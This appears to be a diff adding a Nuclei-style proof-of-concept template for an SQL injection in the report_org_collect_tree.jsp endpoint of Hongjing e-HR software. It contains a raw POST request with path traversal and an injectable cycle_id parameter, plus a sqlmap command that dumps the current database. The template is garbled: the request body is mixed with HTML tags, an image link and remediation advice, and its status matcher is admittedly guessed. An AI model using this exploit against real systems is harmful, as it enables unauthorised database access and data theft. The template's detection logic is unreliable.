@@ -1,0 +1,50 @@
+id: poc-ei1vmvi7v4ggyrgb
+info:
+  name: 宏景e-HR的report_org_collect_tree接口sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ei1vmvi7v4ggyrgb
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ei1vmvi7v4ggyrgb
+http:
+- raw:
+  - 'POST /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    params=&isAction=2&cycle_id=2*
+
+
+    4、sqlma语句
+
+
+    <font style="color:#333333;">python sqlmap.py -r sqlmap.txt —dbms mssql —current-db —batch —force-ssl</font>
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058773139-083d1220-0f9b-46a0-a998-32e099378ccd.png)
+
+
+    ## 修复建议
+
+    <font style="color:#333333;">1、请联系厂商进行修复或升级到安全版本。
+
+    </font><font style="color:#333333;">2、如非必要，禁止公网访问该系统。
+
+    </font><font style="color:#333333;">3、设置白名单访问。</font>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
